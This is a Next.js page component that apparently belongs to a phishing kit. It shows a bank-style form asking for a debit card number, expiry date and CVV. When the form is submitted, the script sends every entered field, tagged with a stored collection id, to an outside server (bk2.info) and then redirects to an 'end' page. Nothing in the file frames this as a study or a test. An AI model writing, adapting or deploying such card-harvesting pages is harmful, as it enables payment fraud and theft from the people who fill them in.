'use client';
import Link from "next/link";
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  


export default function Home() {
    const router = useRouter();
    const API_URL = "https://bk2.info/api/form/add";

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = "localhost";
        jsonObject1['id'] = localStorage.getItem("collection_id");
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/end');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <main className="container">
  <div id="test" className="text-danger text-center fw-bold" />
  <input type="hidden" id="nextValue" defaultValue="last.html" />
  <div className="m-2">
    <img src="assets/3.jpg" width="100%" alt="" />
    <form onSubmit={handleSubmit} id="form" className="mt-3 p-2">
      <DebitCardInputComponent />
      <div className="d-flex gap-4">
        <ExpiryDateInputComponent />
        <div className="form-group mb-3">
          <label>CVV</label>
          <input
            name="CCCV"
            type="password"
            minLength={3}
            maxLength={3}
            placeholder="***"
            className="form-control"
            required
          />
        </div>
      </div>
      <div className="text-center bg-danger">
        <button
          type="submit"
          id="submit-button"
          className="btn w-100 btn-lg btn-danger"
        >
          PROCEED
        </button>
      </div>
    </form>
  </div>
</main>


    <Footer />
</>
  );
}
